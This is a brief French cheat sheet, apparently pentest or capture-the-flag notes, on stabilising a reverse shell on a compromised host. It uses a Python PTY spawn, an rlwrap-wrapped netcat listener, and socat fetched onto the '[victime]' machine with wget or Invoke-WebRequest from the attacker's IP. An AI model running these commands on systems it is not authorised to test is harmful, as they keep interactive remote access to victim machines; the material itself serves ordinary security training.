# Stabiliser un shell avec Python

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Ctrl + Z
```
stty raw -echo; fg
```
```
export TERM=xterm
```

Appuyer sur Entrée ou entrer une commande (exemple: ls)

<br>
<br>

# Avec rlwrap

Sur kali
```
sudo apt install rlwrap
```

```
rlwrap nc -lvnp <port>
```
Ctrl + Z
```
stty raw -echo; fg
```

<br>
<br>

# Avec Socat

Lien du binaire: <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">ici</a>

Sur kali
```
sudo python3 -m http.server 80
```

Sur linux [victime]
```
wget <IP>/socat -O /tmp/socat
```

Ou PowerShell [victime]
```
Invoke-WebRequest -uri <IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```


## Bonus

Pour avoir une sortie de stream plus large et noter les dimensions en rows et en cols
```
stty -a
```

sur le reverse shell
```
stty rows <number>
stty cols <number>
```
